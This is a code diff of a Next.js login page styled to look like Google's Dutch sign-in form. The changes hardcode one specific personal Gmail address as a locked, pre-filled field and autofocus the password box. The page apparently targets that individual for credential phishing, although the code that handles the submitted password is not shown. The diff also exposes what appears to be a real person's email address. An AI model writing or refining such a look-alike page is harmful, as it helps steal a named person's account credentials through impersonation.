@@ -4,7 +4,7 @@ import { useState } from 'react';
 import { useRouter } from 'next/navigation';
 
 export default function LoginPage() {
-  const [email, setEmail] = useState('');
+  const [email] = useState('malouguyader@gmail.com'); // Vast emailadres
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
@@ -100,20 +100,19 @@ export default function LoginPage() {
 
           {/* Formulier */}
           <form onSubmit={handleSubmit} className="space-y-4">
-            {/* Email veld */}
+            {/* Email veld - Al gevuld, readonly */}
             <div className="relative">
               <input
                 id="email"
                 type="email"
                 required
                 value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                className="w-full px-4 pt-[22px] pb-[6px] bg-white border border-[#dadce0] rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer"
-                placeholder=" "
+                readOnly
+                className="w-full px-4 pt-[22px] pb-[6px] bg-[#f8f9fa] border border-[#dadce0] rounded-[4px] text-[16px] text-[#202124] cursor-default peer"
               />
               <label
                 htmlFor="email"
-                className="absolute left-4 top-1/2 -translate-y-1/2 text-[#5f6368] text-[16px] transition-all duration-200 pointer-events-none peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-focus:top-[6px] peer-focus:-translate-y-0 peer-focus:text-[12px] peer-focus:text-[#1a73e8]"
+                className="absolute left-4 top-[6px] text-[12px] text-[#1a73e8] pointer-events-none"
               >
                 E-mailadres of telefoonnummer
               </label>
@@ -129,6 +128,7 @@ export default function LoginPage() {
                 onChange={(e) => setPassword(e.target.value)}
                 className="w-full px-4 pt-[22px] pb-[6px] bg-white border border-[#dadce0] rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer"
                 placeholder=" "
+                autoFocus
               />
               <label
                 htmlFor="password"
@@ -138,7 +138,7 @@ export default function LoginPage() {
               </label>
             </div>
 
-            {/* Alleen de knop - links weg */}
+            {/* Alleen de knop */}
             <div className="flex justify-end pt-2">
               <button
                 type="submit"
